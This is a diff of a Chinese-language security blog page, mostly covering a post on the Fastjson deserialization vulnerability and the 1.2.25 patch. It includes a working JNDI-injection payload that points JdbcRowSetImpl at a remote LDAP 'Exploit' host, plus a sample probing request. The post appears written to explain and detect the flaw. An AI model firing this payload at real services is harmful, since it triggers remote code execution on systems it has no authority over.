@@ -148,7 +148,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jndi</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://8.8.8.8:3119/Exploit\&quot;,\&quot;autoCommit\&quot;:true&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(exp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>实际仔细品一下之后发现,其实就是把恶意参数插入到漏洞点的入口,然后我们payload的内容会按照预定的设置去执行我们要的东西.</p>
 <h1 id="知其所以然-才能知其然"><a href="#知其所以然-才能知其然" class="headerlink" title="知其所以然 才能知其然"></a>知其所以然 才能知其然</h1><p>判断条件执行对应语句,this.conn初始为空,进入到this.connect()<br><img src="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/7.png"><br>进入到this.connect()发现var1.lookup(p1)<br>因为其特殊性JNDI注入,且其需要输入的参数(p1)可控,便可构造payload进行攻击.<br><img src="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/6.png"></p>
-<h1 id="官方更新了1-2-25-修补了以上漏洞"><a href="#官方更新了1-2-25-修补了以上漏洞" class="headerlink" title="官方更新了1.2.25,修补了以上漏洞"></a>官方更新了1.2.25,修补了以上漏洞</h1><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>同样的payload</p>
+<h1 id="官方更新了1-2-25-修补了以上漏洞"><a href="#官方更新了1-2-25-修补了以上漏洞" class="headerlink" title="官方更新了1.2.25,修补了以上漏洞"></a>官方更新了1.2.25,修补了以上漏洞</h1><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><p>同样的payload进行一次攻击,发现控制台报错了,根据报错信息看是com.alibaba.fastjson.parser.ParserConfig.checkAutoType包的问题,看一下源码.<br><img src="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/8.png"></p>
 <h2 id="版本判断"><a href="#版本判断" class="headerlink" title="版本判断"></a>版本判断</h2><h4 id="伪造请求"><a href="#伪造请求" class="headerlink" title="伪造请求"></a>伪造请求</h4><p>请求数据包:</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /local/web/bdc/content/query HTTP/1.1</span><br><span class="line">Host: 8.8.8.8</span><br><span class="line">Cookie: XSRF-TOKEN=f4d99786-6de2-41fc-9063-37608f725a40; SESSION=YmM0YzE3NTktM2MyOC00MWNiLTljOGEtMDEyODFhYjhlYjhm; </span><br><span class="line">Sec-Ch-Ua-Platform: &quot;macOS&quot;</span><br><span class="line">Origin: https://8.8.8.8</span><br><span class="line">Referer: https://8.8.8.8/web/tender/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
 <p>响应数据包:</p>
@@ -161,7 +161,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/" data-id="clamcgp930000gphf8sb50uqz" data-title="Fastjson反序列化漏洞原理及检测利用" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/15/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E6%A3%80%E6%B5%8B%E5%88%A9%E7%94%A8/" data-id="claou3yf500007ohf647adc93" data-title="Fastjson反序列化漏洞原理及检测利用" class="article-share-link">Share</a>
       
       
       
@@ -200,7 +200,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/11/%E9%9D%9E%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="clamcgp970003gphf1k8zairj" data-title="非授权访问" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/11/%E9%9D%9E%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" data-id="claou3yf800027ohf0ogn97k9" data-title="非授权访问" class="article-share-link">Share</a>
       
       
       
@@ -241,7 +241,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/08/%E8%AE%BE%E5%A4%87%E7%BC%BA%E7%9C%81%E5%8F%A3%E4%BB%A4/" data-id="clamcgp960001gphf79e177j2" data-title="设备缺省口令" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/08/%E8%AE%BE%E5%A4%87%E7%BC%BA%E7%9C%81%E5%8F%A3%E4%BB%A4/" data-id="claou3yf900037ohf6ohd42vc" data-title="设备缺省口令" class="article-share-link">Share</a>
       
       
       
@@ -289,7 +289,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/06/curl%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5webshell%E8%B0%83%E8%AF%95/" data-id="clamcgp960002gphffv7v8jp5" data-title="curl工具连接webshell调试" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/06/curl%E5%B7%A5%E5%85%B7%E8%BF%9E%E6%8E%A5webshell%E8%B0%83%E8%AF%95/" data-id="claou3yf800017ohf2pus9jae" data-title="curl工具连接webshell调试" class="article-share-link">Share</a>
       
       
       
